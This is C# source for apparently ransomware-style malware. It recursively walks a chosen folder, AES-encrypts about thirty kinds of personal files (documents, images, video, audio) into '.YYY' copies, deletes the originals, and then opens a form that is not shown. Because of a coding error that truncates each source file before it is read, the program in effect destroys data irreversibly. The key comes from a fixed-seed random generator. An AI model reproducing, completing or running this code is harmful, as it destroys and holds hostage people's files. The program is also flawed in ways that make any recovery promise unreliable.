using System;
using System.IO;
using System.IO.Compression;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace toAES
{
    class Program
    {
        private static readonly string passwordChars = "PJEApewowaegj4250JAEFOgeawaif93";
        static string pass = GeneratePassword(30);

        static void Main(string[] args)
        {
            string CryptoPath = args[0];
            Console.WriteLine(pass);
            ApplyAllFiles(CryptoPath, ProcessFile);



            Form1 form1 = new Form1();
            form1.ShowDialog();
        }
        static void ProcessFile(string path)
        {
            if (Path.GetFileName(path) == "jihou.mp3")
            {
                return;
            }
            try
            {
                switch (Path.GetExtension(path))
                {
                    case ".txt":
                        Task.Run(() => { FileEncrypt(path, pass); });
                        break;
                    case ".jpg":
                        Task.Run(() => { FileEncrypt(path, pass); });
                        break;
                    case ".jpeg":
                        Task.Run(() => { FileEncrypt(path, pass); });
                        break;
                    case ".png":
                        Task.Run(() => { FileEncrypt(path, pass); });
                        break;
                    case ".gif":
                        Task.Run(() => { FileEncrypt(path, pass); });
                        break;
                    case ".tif":
                        Task.Run(() => { FileEncrypt(path, pass); });
                        break;
                    case ".tiff":
                        Task.Run(() => { FileEncrypt(path, pass); });
                        break;
                    case ".eps":
                        Task.Run(() => { FileEncrypt(path, pass); });
                        break;
                    case ".pict":
                        Task.Run(() => { FileEncrypt(path, pass); });
                        break;
                    case ".bmp":
                        Task.Run(() => { FileEncrypt(path, pass); });
                        break;
                    case ".avi":
                        Task.Run(() => { FileEncrypt(path, pass); });
                        break;
                    case ".mov":
                        Task.Run(() => { FileEncrypt(path, pass); });
                        break;
                    case ".flv":
                        Task.Run(() => { FileEncrypt(path, pass); });
                        break;
                    case ".mpg":
                        Task.Run(() => { FileEncrypt(path, pass); });
                        break;
                    case ".mp4":
                        Task.Run(() => { FileEncrypt(path, pass); });
                        break;
                    case ".mkv":
                        Task.Run(() => { FileEncrypt(path, pass); });
                        break;
                    case ".webm":
                        Task.Run(() => { FileEncrypt(path, pass); });
                        break;
                    case ".mp3":
                        Task.Run(() => { FileEncrypt(path, pass); });
                        break;
                    case ".wave":
                        Task.Run(() => { FileEncrypt(path, pass); });
                        break;
                    case ".aif":
                        Task.Run(() => { FileEncrypt(path, pass); });
                        break;
                    case ".aac":
                        Task.Run(() => { FileEncrypt(path, pass); });
                        break;
                    case ".flac":
                        Task.Run(() => { FileEncrypt(path, pass); });
                        break;
                    case ".accdb":
                        Task.Run(() => { FileEncrypt(path, pass); });
                        break;
                    case ".docs":
                        Task.Run(() => { FileEncrypt(path, pass); });
                        break;
                    case ".pptx":
                        Task.Run(() => { FileEncrypt(path, pass); });
                        break;
                    case ".xlsx":
                        Task.Run(() => { FileEncrypt(path, pass); });
                        break;
                    case ".doc":
                        Task.Run(() => { FileEncrypt(path, pass); });
                        break;
                    case ".docm":
                        Task.Run(() => { FileEncrypt(path, pass); });
                        break;
                    case ".odt":
                        Task.Run(() => { FileEncrypt(path, pass); });
                        break;
                    case ".pdf":
                        Task.Run(() => { FileEncrypt(path, pass); });
                        break;
                    case ".csv":
                        Task.Run(() => { FileEncrypt(path, pass); });
                        break;
                }
            }
            catch { }
        }
        static void ApplyAllFiles(string folder, Action<string> fileAction)
        {
            foreach (string file in Directory.GetFiles(folder))
            {
                fileAction(file);
            }
            foreach (string subDir in Directory.GetDirectories(folder))
            {
                try
                {
                    ApplyAllFiles(subDir, fileAction);
                }
                catch
                {
                }
            }
        }
        static private bool FileEncrypt(string FilePath, string Password)
        {
            int len;
            byte[] buffer = new byte[4096];
            //Output file path.
            string OutFilePath = Path.Combine(Path.GetDirectoryName(FilePath), Path.GetFileNameWithoutExtension(FilePath)) + ".YYY";

            using (FileStream outfs = new FileStream(OutFilePath, FileMode.Create, FileAccess.Write))
            {
                using (AesManaged aes = new AesManaged())
                {
                    aes.BlockSize = 128;              // BlockSize = 16bytes
                    aes.KeySize = 128;                // KeySize = 16bytes
                    aes.Mode = CipherMode.CBC;        // CBC mode
                    aes.Padding = PaddingMode.PKCS7;    // Padding mode is "PKCS7".

                    Rfc2898DeriveBytes deriveBytes = new Rfc2898DeriveBytes(Password, 16);
                    byte[] salt = new byte[16];
                    salt = deriveBytes.Salt;
                    byte[] bufferKey = deriveBytes.GetBytes(16);


                    aes.Key = bufferKey;
                    aes.GenerateIV();

                    //Encryption interface.
                    ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);

                    using (CryptoStream cse = new CryptoStream(outfs, encryptor, CryptoStreamMode.Write))
                    {
                        outfs.Write(salt, 0, 16);
                        outfs.Write(aes.IV, 0, 16);
                        using (DeflateStream ds = new DeflateStream(cse, CompressionMode.Compress)) //圧縮
                        {
                            using (FileStream fs = new FileStream(FilePath, FileMode.Create))
                            {
                                while ((len = fs.Read(buffer, 0, 4096)) > 0)
                                {
                                    ds.Write(buffer, 0, len);
                                }
                            }
                        }
                    }
                }
            }
            File.Delete(FilePath);

            return (true);
        }
        static private string GeneratePassword(int length)
        {
            StringBuilder sb = new StringBuilder(length);
            Random r = new Random(1000);

            for (int i = 0; i < length; i++)
            {
                int pos = r.Next(passwordChars.Length);
                char c = passwordChars[pos];
                sb.Append(c);
            }

            return sb.ToString();
        }
    }
}
